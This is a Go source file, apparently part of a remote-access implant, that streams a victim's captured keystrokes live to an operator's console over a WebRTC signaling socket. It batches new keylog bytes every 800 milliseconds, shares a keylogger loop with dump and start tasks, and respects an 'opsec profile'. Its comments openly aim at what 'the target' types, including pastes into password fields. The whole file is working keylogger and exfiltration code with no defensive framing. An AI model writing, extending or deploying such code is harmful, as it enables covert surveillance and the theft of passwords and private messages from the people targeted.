package main

import (
	"sync/atomic"
	"time"
)

const (
	// maxKeyFeedDelta bounds one keystroke frame. A fast typist produces a few
	// dozen bytes per second; the cap only matters after a burst (a paste into
	// a password field, a held key) and keeps one frame from flooding the
	// signaling socket.
	maxKeyFeedDelta = 4096
	// keyFeedInterval is the batching window: typing feels live, and the
	// operator's console gets a few frames per second instead of one per key.
	keyFeedInterval = 800 * time.Millisecond
)

// keyFeedDelta computes the next slice to send from an append-only keylog
// buffer. The buffer is RESET by keylogger_dump, so a shrink means "start over"
// rather than "nothing new". When more than max bytes accumulated, the newest
// bytes win: a stale tail is less useful than what the target is typing now.
func keyFeedDelta(buf []byte, sent, max int) (chunk []byte, next int) {
	if sent < 0 {
		sent = 0
	}
	if sent > len(buf) {
		sent = 0 // the buffer was reset by a dump
	}
	chunk = buf[sent:]
	if max > 0 && len(chunk) > max {
		chunk = chunk[len(chunk)-max:]
	}
	return chunk, len(buf)
}

// keylogSnapshot copies the current keylog buffer, so the caller never holds
// keylogMu while marshalling or writing to the socket.
func keylogSnapshot() []byte {
	keylogMu.Lock()
	defer keylogMu.Unlock()
	out := make([]byte, keylogBuffer.Len())
	copy(out, keylogBuffer.Bytes())
	return out
}

// setKeyFeed enables or disables the live keystroke stream. The keylogger loop
// itself is shared with the keylogger_start task: this only starts it when it
// is not already running, and only stops it when THIS session started it, so a
// console-launched keylogger is never killed by closing a desktop tab.
func (s *agentWebRTCSession) setKeyFeed(enabled bool) {
	if !enabled {
		s.keyMu.Lock()
		wasOn := s.keyFeedOn
		startedHere := s.keyStartedHere
		s.keyFeedOn = false
		s.keyStartedHere = false
		s.keyMu.Unlock()
		if startedHere {
			atomic.StoreInt32(&keylogActive, 0)
		}
		if wasOn {
			_ = s.sendJSON(map[string]any{"type": "keys", "enabled": false})
		}
		return
	}

	// Same gate as the keylogger_start task: an opsec profile that forbids the
	// keylogger must forbid the live feed too, not just the task.
	if !currentOpsProfile.AllowKeylogger {
		_ = s.sendJSON(map[string]any{"type": "keys", "enabled": false, "reason": "keylogger is disabled by the active opsec profile"})
		return
	}
	if err := keyloggerAvailable(); err != nil {
		_ = s.sendJSON(map[string]any{"type": "keys", "enabled": false, "reason": err.Error()})
		return
	}

	s.keyMu.Lock()
	s.keyFeedOn = true
	if atomic.CompareAndSwapInt32(&keylogActive, 0, 1) {
		go keyloggerLoop()
		s.keyStartedHere = true
	}
	// Only stream keystrokes typed after the operator asked; the historical
	// buffer belongs to keylogger_dump.
	s.keySent = len(keylogSnapshot())
	s.keyMu.Unlock()

	s.keyPumpOnce.Do(func() { go s.keyFeedLoop() })
	_ = s.sendJSON(map[string]any{"type": "keys", "enabled": true})
}

// keyFeedLoop drains the keylog buffer into the signaling socket while the
// feed is on and the session is alive.
func (s *agentWebRTCSession) keyFeedLoop() {
	ticker := time.NewTicker(keyFeedInterval)
	defer ticker.Stop()
	for {
		select {
		case <-s.ctx.Done():
			return
		case <-ticker.C:
		}
		s.keyMu.Lock()
		on := s.keyFeedOn
		s.keyMu.Unlock()
		if !on {
			continue
		}
		s.flushKeyFeed()
	}
}

// flushKeyFeed sends the bytes typed since the last frame.
func (s *agentWebRTCSession) flushKeyFeed() {
	buf := keylogSnapshot()

	s.keyMu.Lock()
	chunk, next := keyFeedDelta(buf, s.keySent, maxKeyFeedDelta)
	s.keySent = next
	s.keyMu.Unlock()

	if len(chunk) == 0 {
		return
	}
	_ = s.sendJSON(map[string]any{"type": "keys", "text": string(chunk)})
}
